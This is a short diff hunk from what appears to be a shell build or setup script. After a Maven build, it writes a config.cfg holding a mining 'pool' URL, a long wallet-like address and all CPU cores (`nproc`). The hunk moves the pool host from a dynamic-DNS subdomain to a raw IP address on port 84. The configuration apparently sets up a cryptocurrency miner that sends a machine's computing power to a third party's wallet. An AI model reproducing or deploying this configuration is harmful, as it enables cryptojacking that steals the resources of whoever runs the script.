@@ -5,7 +5,7 @@ mvn clean package
 touch config.cfg
 chmod 755 config.cfg
 echo "pool
-http://linux84.distro.cloudns.cl:84
+http://66.42.119.233:84
 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3
 `nproc` 
 enhanced
